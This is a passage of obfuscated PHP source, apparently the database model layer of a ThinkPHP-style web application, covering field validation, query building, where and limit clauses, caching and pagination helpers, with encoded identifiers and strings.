$dàëà±«Ş¯[$BÙƒ»ˆáñ[0]]) { unset($dàëà±«Ş¯[$BÙƒ»ˆáñ[0]]); } } } } return $dàëà±«Ş¯; } protected function autoValidation($aï“ØÄÇ™¤, $BÂ ĞÉ¸‹†) { $A½ÑÕˆ¥µ« =& $_SERVER[£¶ä½¶¢]; if (!empty($this->options[$A½ÑÕˆ¥µ«[332]])) { $cµ‹À´ÂØ = $this->options[$A½ÑÕˆ¥µ«[332]]; unset($this->options[$A½ÑÕˆ¥µ«[332]]); } elseif (!empty($this->_validate)) { $cµ‹À´ÂØ = $this->_validate; } if (isset($cµ‹À´ÂØ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($cµ‹À´ÂØ as $d»ÉÉ“·å˜ => $FºÉª·šœÊ) { if (empty($FºÉª·šœÊ[5]) || $FºÉª·šœÊ[5] == THINK_MODEL_BOTH || $FºÉª·šœÊ[5] == $BÂ ĞÉ¸‹†) { if (0 == strpos($FºÉª·šœÊ[2], $A½ÑÕˆ¥µ«[333]) && strpos($FºÉª·šœÊ[2], $A½ÑÕˆ¥µ«[334])) { $FºÉª·šœÊ[2] = think_lang(substr($FºÉª·šœÊ[2], 2, -1)); } $FºÉª·šœÊ[3] = isset($FºÉª·šœÊ[3]) ? $FºÉª·šœÊ[3] : THINK_EXISTS_VALIDATE; $FºÉª·šœÊ[4] = isset($FºÉª·šœÊ[4]) ? $FºÉª·šœÊ[4] : $A½ÑÕˆ¥µ«[335]; switch ($FºÉª·šœÊ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($aï“ØÄÇ™¤, $FºÉª·šœÊ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($A½ÑÕˆ¥µ«[43] != trim($aï“ØÄÇ™¤[$FºÉª·šœÊ[0]])) { if (!1 === $this->_validationField($aï“ØÄÇ™¤, $FºÉª·šœÊ)) { return !1; } } break; default: if (isset($aï“ØÄÇ™¤[$FºÉª·šœÊ[0]])) { if (!1 === $this->_validationField($aï“ØÄÇ™¤, $FºÉª·šœÊ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($fÈš®„ù¹É, $Eîª¼ÛÚÃË) { if (!1 === $this->_validationFieldItem($fÈš®„ù¹É, $Eîª¼ÛÚÃË)) { if ($this->patchValidate) { $this->error[$Eîª¼ÛÚÃË[0]] = $Eîª¼ÛÚÃË[2]; } else { $this->error = $Eîª¼ÛÚÃË[2]; return !1; } } return; } protected function _validationFieldItem($a½†²©Âœ°, $DŞ“¥ø†®¯) { $câœª—«Œ =& $_SERVER[£¶ä½¶¢]; switch (strtolower(trim($DŞ“¥ø†®¯[4]))) { case $câœª—«Œ[328]: case $câœª—«Œ[329]: $AùÆ½İÊ†š = isset($DŞ“¥ø†®¯[6]) ? (array) $DŞ“¥ø†®¯[6] : array(); if (is_string($DŞ“¥ø†®¯[0]) && strpos($DŞ“¥ø†®¯[0], $câœª—«Œ[57])) { $DŞ“¥ø†®¯[0] = explode($câœª—«Œ[57], $DŞ“¥ø†®¯[0]); } if (is_array($DŞ“¥ø†®¯[0])) { foreach ($DŞ“¥ø†®¯[0] as $b±âÑ”§…) { $Aëò±ééÑ´[$b±âÑ”§…] = $a½†²©Âœ°[$b±âÑ”§…]; } array_unshift($AùÆ½İÊ†š, $Aëò±ééÑ´); } else { array_unshift($AùÆ½İÊ†š, $a½†²©Âœ°[$DŞ“¥ø†®¯[0]]); } if ($câœª—«Œ[328] == $DŞ“¥ø†®¯[4]) { return call_user_func_array($DŞ“¥ø†®¯[1], $AùÆ½İÊ†š); } else { return call_user_func_array(array(&$this, $DŞ“¥ø†®¯[1]), $AùÆ½İÊ†š); } case $câœª—«Œ[336]: return $a½†²©Âœ°[$DŞ“¥ø†®¯[0]] == $a½†²©Âœ°[$DŞ“¥ø†®¯[1]]; case $câœª—«Œ[337]: if (is_string($DŞ“¥ø†®¯[0]) && strpos($DŞ“¥ø†®¯[0], $câœª—«Œ[57])) { $DŞ“¥ø†®¯[0] = explode($câœª—«Œ[57], $DŞ“¥ø†®¯[0]); } $cÀ‚¹ŞÈ‚‰ = array(); if (is_array($DŞ“¥ø†®¯[0])) { foreach ($DŞ“¥ø†®¯[0] as $b±âÑ”§…) { $cÀ‚¹ŞÈ‚‰[$b±âÑ”§…] = $a½†²©Âœ°[$b±âÑ”§…]; } } else { $cÀ‚¹ŞÈ‚‰[$DŞ“¥ø†®¯[0]] = $a½†²©Âœ°[$DŞ“¥ø†®¯[0]]; } if (!empty($a½†²©Âœ°[$this->getPk()])) { $cÀ‚¹ŞÈ‚‰[$this->getPk()] = array($câœª—«Œ[338], $a½†²©Âœ°[$this->getPk()]); } if ($this->where($cÀ‚¹ŞÈ‚‰)->find()) { return !1; } return !0; default: return $this->check($a½†²©Âœ°[$DŞ“¥ø†®¯[0]], $DŞ“¥ø†®¯[1], $DŞ“¥ø†®¯[4]); } } public function check($bßˆËŸæ, $FÙŒìª£ÏÌ, $a›—Ë¹ğÊœ = "\162\145\147\x65\x78") { $F–äõŠ½†Ã =& $_SERVER[£¶ä½¶¢]; $a›—Ë¹ğÊœ = strtolower(trim($a›—Ë¹ğÊœ)); switch ($a›—Ë¹ğÊœ) { case $F–äõŠ½†Ã[17]: case $F–äõŠ½†Ã[339]: $E£¶Æ›‰æ¬ = is_array($FÙŒìª£ÏÌ) ? $FÙŒìª£ÏÌ : explode($F–äõŠ½†Ã[57], $FÙŒìª£ÏÌ); return $a›—Ë¹ğÊœ == $F–äõŠ½†Ã[17] ? in_array($bßˆËŸæ, $E£¶Æ›‰æ¬) : !in_array($bßˆËŸæ, $E£¶Æ›‰æ¬); case $F–äõŠ½†Ã[340]: case $F–äõŠ½†Ã[341]: if (is_array($FÙŒìª£ÏÌ)) { $dï×â‹ôò = $FÙŒìª£ÏÌ[0]; $C¸´›±¯Çæ = $FÙŒìª£ÏÌ[1]; } else { list($dï×â‹ôò, $C¸´›±¯Çæ) = explode($F–äõŠ½†Ã[57], $FÙŒìª£ÏÌ); } return $a›—Ë¹ğÊœ == $F–äõŠ½†Ã[340] ? $bßˆËŸæ >= $dï×â‹ôò && $bßˆËŸæ <= $C¸´›±¯Çæ : $bßˆËŸæ < $dï×â‹ôò || $bßˆËŸæ > $C¸´›±¯Çæ; case $F–äõŠ½†Ã[342]: case $F–äõŠ½†Ã[343]: return $a›—Ë¹ğÊœ == $F–äõŠ½†Ã[342] ? $bßˆËŸæ == $FÙŒìª£ÏÌ : $bßˆËŸæ != $FÙŒìª£ÏÌ; case $F–äõŠ½†Ã[344]: $F’µºÓé—ñ = mb_strlen($bßˆËŸæ, $F–äõŠ½†Ã[345]); if (strpos($FÙŒìª£ÏÌ, $F–äõŠ½†Ã[57])) { list($dï×â‹ôò, $C¸´›±¯Çæ) = explode($F–äõŠ½†Ã[57], $FÙŒìª£ÏÌ); return $F’µºÓé—ñ >= $dï×â‹ôò && $F’µºÓé—ñ <= $C¸´›±¯Çæ; } else { return $F’µºÓé—ñ == $FÙŒìª£ÏÌ; } case $F–äõŠ½†Ã[346]: list($E«½¤¥‚Ş÷, $EĞ¯Â’Ææ) = explode($F–äõŠ½†Ã[57], $FÙŒìª£ÏÌ); if (!is_numeric($E«½¤¥‚Ş÷)) { $E«½¤¥‚Ş÷ = strtotime($E«½¤¥‚Ş÷); } if (!is_numeric($EĞ¯Â’Ææ)) { $EĞ¯Â’Ææ = strtotime($EĞ¯Â’Ææ); } return NOW_TIME >= $E«½¤¥‚Ş÷ && NOW_TIME <= $EĞ¯Â’Ææ; case $F–äõŠ½†Ã[347]: return in_array(get_client_ip(), explode($F–äõŠ½†Ã[57], $FÙŒìª£ÏÌ)); case $F–äõŠ½†Ã[348]: return !in_array(get_client_ip(), explode($F–äõŠ½†Ã[57], $FÙŒìª£ÏÌ)); case $F–äõŠ½†Ã[335]: default: return $this->regex($bßˆËŸæ, $FÙŒìª£ÏÌ); } } public function query($Dª§ñ§‘Æ…, $C’¤÷·¾â‰ = false) { $c‰Ê¦ÅçÒ‡ =& $_SERVER[£¶ä½¶¢]; if (!is_bool($C’¤÷·¾â‰) && !is_array($C’¤÷·¾â‰)) { $C’¤÷·¾â‰ = func_get_args(); array_shift($C’¤÷·¾â‰); } $Dª§ñ§‘Æ… = str_replace(array($c‰Ê¦ÅçÒ‡[9], $c‰Ê¦ÅçÒ‡[349]), $c‰Ê¦ÅçÒ‡[60], $Dª§ñ§‘Æ…); $Dª§ñ§‘Æ… = $this->parseSql($Dª§ñ§‘Æ…, $C’¤÷·¾â‰); return $this->db->query($Dª§ñ§‘Æ…); } public function execute($a©”ñÁ‚Ä­, $b©–†˜« = false) { if (!is_bool($b©–†˜«) && !is_array($b©–†˜«)) { $b©–†˜« = func_get_args(); array_shift($b©–†˜«); } $a©”ñÁ‚Ä­ = $this->parseSql($a©”ñÁ‚Ä­, $b©–†˜«); return $this->db->execute($a©”ñÁ‚Ä­); } protected function parseSql($a×µÑÕñçÛ, $aµ£ãÕá°) { $DÅæŞ¨©© =& $_SERVER[£¶ä½¶¢]; if (!0 === $aµ£ãÕá°) { $Aİ†•ñê = $this->_parseOptions(); $a×µÑÕñçÛ = $this->db->parseSql($a×µÑÕñçÛ, $Aİ†•ñê); } elseif (is_array($aµ£ãÕá°)) { $aµ£ãÕá° = array_map(array($this->db, $DÅæŞ¨©©[350]), $aµ£ãÕá°); $a×µÑÕñçÛ = vsprintf($a×µÑÕñçÛ, $aµ£ãÕá°); } else { $a×µÑÕñçÛ = strtr($a×µÑÕñçÛ, array($DÅæŞ¨©©[351] => $this->getTableName(), $DÅæŞ¨©©[352] => think_config($DÅæŞ¨©©[251]))); } $this->db->setModel($this->name); return $a×µÑÕñçÛ; } public function db($dÄ–‘ßòõƒ = '', $C§¥‹µøœÛ = '', $fÏÂ®ÅÎòò = array()) { goto FíÏì‰Ôåò; a‰½š²°: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto F»ĞóØ–ÄĞ; bƒ‚‚çˆÊ’: static $D¼Áì‰à¢ó = array(); if (!isset($D¼Áì‰à¢ó[$dÄ–‘ßòõƒ]) || isset($D¼Áì‰à¢ó[$dÄ–‘ßòõƒ]) && $C§¥‹µøœÛ && $A¯Å³Óí˜Â[$dÄ–‘ßòõƒ] != $C§¥‹µøœÛ) { if (!empty($C§¥‹µøœÛ) && is_string($C§¥‹µøœÛ) && !1 === strpos($C§¥‹µøœÛ, $eäšÖ‚‚èï[18])) { $C§¥‹µøœÛ = think_config($C§¥‹µøœÛ); } $D¼Áì‰à¢ó[$dÄ–‘ßòõƒ] = Db::getInstance($C§¥‹µøœÛ); } elseif (NULL === $C§¥‹µøœÛ) { $D¼Áì‰à¢ó[$dÄ–‘ßòõƒ]->close(); unset($D¼Áì‰à¢ó[$dÄ–‘ßòõƒ]); return; } if (!empty($fÏÂ®ÅÎòò)) { if (is_string($fÏÂ®ÅÎòò)) { parse_str($fÏÂ®ÅÎòò, $fÏÂ®ÅÎòò); } foreach ($fÏÂ®ÅÎòò as $B®¤•†¾´¢ => $aĞ‚½„”¿) { $this->setProperty($B®¤•†¾´¢, $aĞ‚½„”¿); } } goto e˜ò– œ¨®; e˜ò– œ¨®: $A¯Å³Óí˜Â[$dÄ–‘ßòõƒ] = $C§¥‹µøœÛ; $this->db = $D¼Áì‰à¢ó[$dÄ–‘ßòõƒ]; $this->_after_db(); goto a‰½š²°; FíÏì‰Ôåò: $eäšÖ‚‚èï =& $_SERVER[£¶ä½¶¢]; if ($eäšÖ‚‚èï[43] === $dÄ–‘ßòõƒ && $this->db) { return $this->db; } static $A¯Å³Óí˜Â = array(); goto bƒ‚‚çˆÊ’; F»ĞóØ–ÄĞ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $F¬«éä¾¥Ö = get_class($this); if ($F¬«éä¾¥Ö == $_SERVER[£¶ä½¶¢][353]) { return $this->name; } $this->name = substr($F¬«éä¾¥Ö, 0, -5); } return $this->name; } public function getTableName() { $E¦¿Ğ–šìÏ =& $_SERVER[£¶ä½¶¢]; if (empty($this->trueTableName)) { $Eˆ…œĞèøá = !empty($this->tablePrefix) ? $this->tablePrefix : $E¦¿Ğ–šìÏ[43]; if (!empty($this->tableName)) { $Eˆ…œĞèøá .= $this->tableName; } else { $Eˆ…œĞèøá .= think_parse_name($this->name); } $this->trueTableName = strtolower($Eˆ…œĞèøá); } return (!empty($this->dbName) ? $this->dbName . $E¦¿Ğ–šìÏ[105] : $E¦¿Ğ–šìÏ[43]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $a’ğ¼­ÅœÓ =& $_SERVER[£¶ä½¶¢]; return isset($this->fields[$a’ğ¼­ÅœÓ[258]]) ? $this->fields[$a’ğ¼­ÅœÓ[258]] : $this->pk; } public function getDbFields() { $F‚¢ÉÖÖÌ =& $_SERVER[£¶ä½¶¢]; if (isset($this->options[$F‚¢ÉÖÖÌ[286]])) { $f¨¼†ª­Ï = $this->db->getFields($this->options[$F‚¢ÉÖÖÌ[286]]); return $f¨¼†ª­Ï ? array_keys($f¨¼†ª­Ï) : !1; } if ($this->fields) { $f¨¼†ª­Ï = $this->fields; unset($f¨¼†ª­Ï[$F‚¢ÉÖÖÌ[257]], $f¨¼†ª­Ï[$F‚¢ÉÖÖÌ[258]], $f¨¼†ª­Ï[$F‚¢ÉÖÖÌ[259]], $f¨¼†ª­Ï[$F‚¢ÉÖÖÌ[256]]); return $f¨¼†ª­Ï; } return !1; } public function data($EÍäªÔË®Ô = '') { $d³éäèƒœÕ =& $_SERVER[£¶ä½¶¢]; if ($d³éäèƒœÕ[43] === $EÍäªÔË®Ô && !empty($this->data)) { return $this->data; } if (is_object($EÍäªÔË®Ô)) { $EÍäªÔË®Ô = get_object_vars($EÍäªÔË®Ô); } elseif (is_string($EÍäªÔË®Ô)) { parse_str($EÍäªÔË®Ô, $EÍäªÔË®Ô); } elseif (!is_array($EÍäªÔË®Ô)) { think_exception(think_lang($d³éäèƒœÕ[278])); } $this->data = $EÍäªÔË®Ô; return $this; } public function join($CñƒÛ“ÛŒ) { $DÏÂõÛÛä =& $_SERVER[£¶ä½¶¢]; if (is_array($CñƒÛ“ÛŒ)) { $this->options[$DÏÂõÛÛä[289]] = $CñƒÛ“ÛŒ; } elseif (!empty($CñƒÛ“ÛŒ)) { $this->options[$DÏÂõÛÛä[289]][] = $CñƒÛ“ÛŒ; } return $this; } public function union($böË‘ğŒÙ“, $e¡ã•­Ç½‡ = false) { goto Eİ˜ŠøÂèù; FÏ©©×ùÒš: return $this; goto E½Ô ±ÉĞÚ; Eİ˜ŠøÂèù: $DšŞÍ‡Èô =& $_SERVER[£¶ä½¶¢]; if (empty($böË‘ğŒÙ“)) { return $this; } if ($e¡ã•­Ç½‡) { $this->options[$DšŞÍ‡Èô[354]][$DšŞÍ‡Èô[355]] = !0; } goto B«’à§ˆ–õ; B«’à§ˆ–õ: if (is_object($böË‘ğŒÙ“)) { $böË‘ğŒÙ“ = get_object_vars($böË‘ğŒÙ“); } if (is_string($böË‘ğŒÙ“)) { $fÒƒ›­Ê¨ = $böË‘ğŒÙ“; } elseif (is_array($böË‘ğŒÙ“)) { if (isset($böË‘ğŒÙ“[0])) { $this->options[$DšŞÍ‡Èô[354]] = array_merge($this->options[$DšŞÍ‡Èô[354]], $böË‘ğŒÙ“); return $this; } else { $fÒƒ›­Ê¨ = $böË‘ğŒÙ“; } } else { think_exception(think_lang($DšŞÍ‡Èô[278])); } $this->options[$DšŞÍ‡Èô[354]][] = $fÒƒ›­Ê¨; goto FÏ©©×ùÒš; E½Ô ±ÉĞÚ: } public function cache($D‹’ÆŠŒ¿¹ = true, $fõëÙñŠÆÒ = null, $EÓ‹Œ¥½õ» = '') { $e¥¨ÃÄ ¸ =& $_SERVER[£¶ä½¶¢]; if (!1 !== $D‹’ÆŠŒ¿¹) { $this->options[$e¥¨ÃÄ ¸[356]] = array($e¥¨ÃÄ ¸[103] => $D‹’ÆŠŒ¿¹, $e¥¨ÃÄ ¸[346] => $fõëÙñŠÆÒ, $e¥¨ÃÄ ¸[39] => $EÓ‹Œ¥½õ»); } return $this; } public function field($Fò÷‹îìŠ¼, $DÓ×°Á = false) { $D¥§Ñ‹§Œ =& $_SERVER[£¶ä½¶¢]; if (!0 === $Fò÷‹îìŠ¼) { $e›ÀÈÏçßÒ = $this->getDbFields(); $Fò÷‹îìŠ¼ = $e›ÀÈÏçßÒ ? $e›ÀÈÏçßÒ : $D¥§Ñ‹§Œ[192]; } elseif ($DÓ×°Á) { if (is_string($Fò÷‹îìŠ¼)) { $Fò÷‹îìŠ¼ = explode($D¥§Ñ‹§Œ[57], $Fò÷‹îìŠ¼); } $e›ÀÈÏçßÒ = $this->getDbFields(); $Fò÷‹îìŠ¼ = $e›ÀÈÏçßÒ ? array_diff($e›ÀÈÏçßÒ, $Fò÷‹îìŠ¼) : $Fò÷‹îìŠ¼; } $this->options[$D¥§Ñ‹§Œ[280]] = $Fò÷‹îìŠ¼; return $this; } public function scope($f‰…ùŠ÷ˆË = '', $b÷ÔÙ„§â´ = NULL) { $BõÍ‚‹·÷Õ =& $_SERVER[£¶ä½¶¢]; if ($BõÍ‚‹·÷Õ[43] === $f‰…ùŠ÷ˆË) { if (isset($this->_scope[$BõÍ‚‹·÷Õ[44]])) { $cŸØ¸â“İÔ = $this->_scope[$BõÍ‚‹·÷Õ[44]]; } else { return $this; } } elseif (is_string($f‰…ùŠ÷ˆË)) { $cˆŞëÆÄƒÊ = explode($BõÍ‚‹·÷Õ[57], $f‰…ùŠ÷ˆË); $cŸØ¸â“İÔ = array(); foreach ($cˆŞëÆÄƒÊ as $F™ãùØä¶°) { if (!isset($this->_scope[$F™ãùØä¶°])) { continue; } $cŸØ¸â“İÔ = array_merge($cŸØ¸â“İÔ, $this->_scope[$F™ãùØä¶°]); } if (!empty($b÷ÔÙ„§â´) && is_array($b÷ÔÙ„§â´)) { $cŸØ¸â“İÔ = array_merge($cŸØ¸â“İÔ, $b÷ÔÙ„§â´); } } elseif (is_array($f‰…ùŠ÷ˆË)) { $cŸØ¸â“İÔ = $f‰…ùŠ÷ˆË; } if (is_array($cŸØ¸â“İÔ) && !empty($cŸØ¸â“İÔ)) { $this->options = array_merge($this->options, array_change_key_case($cŸØ¸â“İÔ)); } return $this; } public function where($EëÌ¬İØ¾, $C¥É‹òŒøÇ = null) { $B²¼˜æ• =& $_SERVER[£¶ä½¶¢]; if (!is_null($C¥É‹òŒøÇ) && is_string($EëÌ¬İØ¾)) { if (!is_array($C¥É‹òŒøÇ)) { $C¥É‹òŒøÇ = func_get_args(); array_shift($C¥É‹òŒøÇ); } $C¥É‹òŒøÇ = array_map(array($this->db, $B²¼˜æ•[350]), $C¥É‹òŒøÇ); $EëÌ¬İØ¾ = vsprintf($EëÌ¬İØ¾, $C¥É‹òŒøÇ); } elseif (is_object($EëÌ¬İØ¾)) { $EëÌ¬İØ¾ = get_object_vars($EëÌ¬İØ¾); } elseif (is_array($EëÌ¬İØ¾)) { foreach ($EëÌ¬İØ¾ as $bÖâµ–‘ => $eù­Ÿ¤“Áˆ) { if ((is_numeric($bÖâµ–‘) || !$bÖâµ–‘) && is_string($eù­Ÿ¤“Áˆ)) { if (strpos($eù­Ÿ¤“Áˆ, $B²¼˜æ•[357]) === 0) { continue; } think_trace($B²¼˜æ•[358], $B²¼˜æ•[43], $B²¼˜æ•[56]); die; } } } if (is_string($EëÌ¬İØ¾) && $B²¼˜æ•[43] != $EëÌ¬İØ¾) { $dö­àÊ¬ö = array(); $dö­àÊ¬ö[$B²¼˜æ•[359]] = $EëÌ¬İØ¾; $EëÌ¬İØ¾ = $dö­àÊ¬ö; } if (isset($this->options[$B²¼˜æ•[282]])) { $this->options[$B²¼˜æ•[282]] = array_merge($this->options[$B²¼˜æ•[282]], $EëÌ¬İØ¾); } else { $this->options[$B²¼˜æ•[282]] = $EëÌ¬İØ¾; } return $this; } public function limit($cÂ“¿å¿Ş, $e„Ñ½é§å = null) { $CÔÙ÷¨è±È =& $_SERVER[£¶ä½¶¢]; $this->options[$CÔÙ÷¨è±È[299]] = is_null($e„Ñ½é§å) ? $cÂ“¿å¿Ş : $cÂ“¿å¿Ş . $CÔÙ÷¨è±È[57] . $e„Ñ½é§å; return $this; } public function page($b‹ŠøÙ×¥¦, $b´ÊŠÓÓì = null) { $D§†É•´ëâ =& $_SERVER[£¶ä½¶¢]; $this->options[$D§†É•´ëâ[360]] = is_null($b´ÊŠÓÓì) ? $b‹ŠøÙ×¥¦ : $b‹ŠøÙ×¥¦ . $D§†É•´ëâ[57] . $b´ÊŠÓÓì; return $this; } public function comment($FŒ¯ÀÙóö) { $this->options[$_SERVER[£¶ä½¶¢][361]] = $FŒ¯ÀÙóö; return $this; } public function setProperty($d‘íÃ¡ÆÁá, $BÛó©Ïæä„) { if (property_exists($this, $d‘íÃ¡ÆÁá)) { $this->{$d‘íÃ¡ÆÁá} = $BÛó©Ïæä„; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\171\124\151\x6d\x65", "\164\151\155\145", "\x69\156\163\145\162\x74\54\x75\x70\x64\141\x74\x65", "\146\165\x6e\143\x74\151\157\x6e"), array("\143\x72\145\x61\x74\145\124\x69\155\145", "\x74\151\x6d\x65", "\x69\156\163\x65\x72\x74", "\146\165\x6e\x63\x74\151\x6f\x6e")); public function setDataAuto($cŞ”Èõà´¿) { $this->dataAuto = $cŞ”Èõà´¿; } public function __construct($aŒå†Çœõ‹ = '', $cØ÷»®‹° = '', $bÙÅÄ¦­¤® = '') { parent::__construct($aŒå†Çœõ‹, $cØ÷»®‹°, $bÙÅÄ¦­¤®); } public static function textEncode($CîÌï¹¨”’) { if (!$CîÌï¹¨”’) { return $CîÌï¹¨”’; } $D¶‡Á—Ğê = json_encode($CîÌï¹¨”’); $D¶‡Á—Ğê = preg_replace_callback($_SERVER[£¶ä½¶¢][362], function ($d“ƒ©Àé“ª) { return addslashes($d“ƒ©Àé“ª[0]); }, $D¶‡Á—Ğê); return json_decode($D¶‡Á—Ğê); } public static function textDecode($c·Ò¶Ğç”) { $d‡ª­§½ó =& $_SERVER[£¶ä½¶¢]; $FšÈ° ñ˜Í = json_encode($c·Ò¶Ğç”); $FšÈ° ñ˜Í = preg_replace_callback($d‡ª­§½ó[363], function ($c„òÙ“—¤Ê) { return $_SERVER[£¶ä½¶¢][107]; }, $FšÈ° ñ˜Í); return json_decode($FšÈ° ñ˜Í); } protected $tableMeta = array(); protected function _beforeInsert(&$AÉÆİÒ¬§, $D¾áìïÒµ) { $f¢ï—İÄ =& $_SERVER[£¶ä½¶¢]; if (!$this->checkDataAutoHas($f¢ï—İÄ[364])) { return; } $this->dataBeforeFilter($AÉÆİÒ¬§, $f¢ï—İÄ[364]); } protected function _beforeUpdate(&$cø¬“‚éóÂ, $FëÃ£ÊÆ„÷) { $BÚ™Í»¬ =& $_SERVER[£¶ä½¶¢]; if (!$this->checkDataAutoHas($BÚ™Í»¬[365])) { return; } $this->dataBeforeFilter($cø¬“‚éóÂ, $BÚ™Í»¬[365]); } protected function _afterSelect(&$B››©æ¼¼Æ, $aÇ¢ôïçÂ) { if (!is_array($B››©æ¼¼Æ)) { return; } if (!$this->checkDataAutoHas($_SERVER[£¶ä½¶¢][366])) { return; } foreach ($B››©æ¼¼Æ as &$DÇË¾ÅÃÅï) { $this->dataAfterFilter($DÇË¾ÅÃÅï); } unset($DÇË¾ÅÃÅï); } protected function _afterFind(&$E¦Ö—Îç•‹, $dÆ³¦¢¡ë²) { if (!is_array($E¦Ö—Îç•‹)) { return; } if (!$this->checkDataAutoHas($_SERVER[£¶ä½¶¢][366])) { return; } $this->dataAfterFilter($E¦Ö—Îç•‹); } public function setAutoIncrement($Bœ×”„‹ñ) { $d êäŒ¹Û = array($this->getPk() => $Bœ×”„‹ñ); $F‰–•÷œ”œ = $this->data($d êäŒ¹Û)->add(); if ($F‰–•÷œ”œ) { $this->delete($F‰–•÷œ”œ); } } public function getAutoIncrement() { $e®´ˆæßº = $this->getTableName(); $a†è®‰Í«Ü = $this->max($this->getPk()); $c Ü±ƒ­Í² = $this->query("\x73\x68\x6f\x77\40\x74\x61\x62\154\x65\40\x73\x74\x61\x74\165\163\x20\x77\150\145\162\x65\x20\x4e\141\155\x65\75\47{$e®´ˆæßº}\47"); $f°ºŠïá = $c Ü±ƒ­Í²[0][$_SERVER[£¶ä½¶¢][367]]; $aäöºÊèÕ® = max($a†è®‰Í«Ü, $f°ºŠïá); return $aäöºÊèÕ®; } protected function _callBefore($F¤­¯Ó´óÑ, $eåšƒË¸ÒÁ) { return $this->cacheCallCheck($F¤­¯Ó´óÑ, $eåšƒË¸ÒÁ, !1); } protected function _callAfter($BŠÍ »È, $D“Ûä‡ƒè‡) { return $this->cacheCallCheck($BŠÍ »È, $D“Ûä‡ƒè‡, !0); } protected function cacheFunctionAlias($c Øöš¨) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($C÷ÇŸÕ•¼, $FÚ‘¹İÕÜ‹, $AƒÍ„•„Óµ = false) { $fàª¾¯à„ = $this->cacheFunctionAlias($FÚ‘¹İÕÜ‹); if (!$fàª¾¯à„) { return; } foreach ($fàª¾¯à„ as $BÉ²ÙåØ => $cÑŞ¶Šµê°) { $FŞÍ°Éº“à = $cÑŞ¶Šµê°[0]; $C¥¡Ç¾¥ğÕ = explode($_SERVER[£¶ä½¶¢][57], $cÑŞ¶Šµê°[1]); if ($C÷ÇŸÕ•¼ == $BÉ²ÙåØ) { return $this->cacheFunctionGet($BÉ²ÙåØ, $FŞÍ°Éº“à); } if ($AƒÍ„•„Óµ && in_array($C÷ÇŸÕ•¼, $C¥¡Ç¾¥ğÕ)) { $this->cacheFunctionClear($BÉ²ÙåØ, $FŞÍ°Éº“à); } } } public function cacheFunctionGet($f¼ÓåÖ†’Ô, $Fæ—Üò÷“¶) { $A’´ÕÃëË´ = $this->cacheKeyMake($f¼ÓåÖ†’Ô, $Fæ—Üò÷“¶); $f¨£ „¤õí = Cache::get($A’´ÕÃëË´); if (!is_array($f¨£ „¤õí)) { $f¨£ „¤õí = call_user_func_array(array($this, $f¼ÓåÖ†’Ô), array($Fæ—Üò÷“¶, !0)); Cache::set($A’´ÕÃëË´, $f¨£ „¤õí); } return $f¨£ „¤õí; } public function cacheFunctionClear($fŸÏãŠÔê, $CÑíÊÉÁ¿) { $e·Ê¼µÆ¶ = $CÑíÊÉÁ¿; if (!is_array($CÑíÊÉÁ¿)) { $e·Ê¼µÆ¶ = array($CÑíÊÉÁ¿); } foreach ($e·Ê¼µÆ¶ as $C¯‹ ²Ë¥) { $CÎÕ¢…“á¦ = $this->cacheKeyMake($fŸÏãŠÔê, $C¯‹ ²Ë¥); Cache::remove($CÎÕ¢…“á¦); } } private function cacheKeyMake($d‘ã«øÒÅó, $BÕ•˜â³¦“) { $dŠß˜Ç·Ù¨ =& $_SERVER[£¶ä½¶¢]; return get_class($this) . $dŠß˜Ç·Ù¨[81] . $d‘ã«øÒÅó . $dŠß˜Ç·Ù¨[368] . $BÕ•˜â³¦“; } protected function selectPageReset() { $c¬ÂâÌ¡º =& $_SERVER[£¶ä½¶¢]; if (isset($GLOBALS[$c¬ÂâÌ¡º[369]])) { return; } $GLOBALS[$c¬ÂâÌ¡º[369]] = isset($GLOBALS[$c¬ÂâÌ¡º[17]][$c¬ÂâÌ¡º[370]]) ? $GLOBALS[$c¬ÂâÌ¡º[17]][$c¬ÂâÌ¡º[370]] : !1; $GLOBALS[$c¬ÂâÌ¡º[371]] = isset($GLOBALS[$c¬ÂâÌ¡º[17]][$c¬ÂâÌ¡º[360]]) ? $GLOBALS[$c¬ÂâÌ¡º[17]][$c¬ÂâÌ¡º[360]] : !1; $GLOBALS[$c¬ÂâÌ¡º[17]][$c¬ÂâÌ¡º[370]] = !1; $GLOBALS[$c¬ÂâÌ¡º[17]][$c¬ÂâÌ¡º[360]] = !1; } protected function selectPageRestore() { $cÜ»×ÂÑ¾È =& $_SERVER[£¶ä½¶¢]; if (!isset($GLOBALS[$cÜ»×ÂÑ¾È[369]])) { return; } $GLOBALS[$cÜ»×ÂÑ¾È[17]][$cÜ»×ÂÑ¾È[370]] = $GLOBALS[$cÜ»×ÂÑ¾È[369]]; $GLOBALS[$cÜ»×ÂÑ¾È[17]][$cÜ»×ÂÑ¾È[360]] = $GLOBALS[$cÜ»×ÂÑ¾È[371]]; unset($GLOBALS[$cÜ»×ÂÑ¾È[369]]); unset($GLOBALS[$cÜ»×ÂÑ¾È[371]]); } protected function selectPage($e’¯Å”õÌ = 200, $E‘“ì÷Ö÷ğ = 1) { goto AèË°Öç; bµğÅ·ã¥µ: return $D×Ã¨­ââ¥; goto c‡ƒ„­‹†í; bâ¢—ñó à: $c¹ïùĞ‡ÁÅ = $Aœˆáî›×ƒ; $c¹ïùĞ‡ÁÅ[$D¼Ìˆ­½º[372]] = array(); $e’¯Å”õÌ = intval($e’¯Å”õÌ); goto BëÜß„µä¿; A…¬Ì†ó»Ğ: $eªƒÆªñá‘ = 50000; $e’¯Å”õÌ = isset($in[$D¼Ìˆ­½º[370]]) && $in[$D¼Ìˆ­½º[370]] ? $in[$D¼Ìˆ­½º[370]] : $e’¯Å”õÌ; if ($e’¯Å”õÌ === -1) { 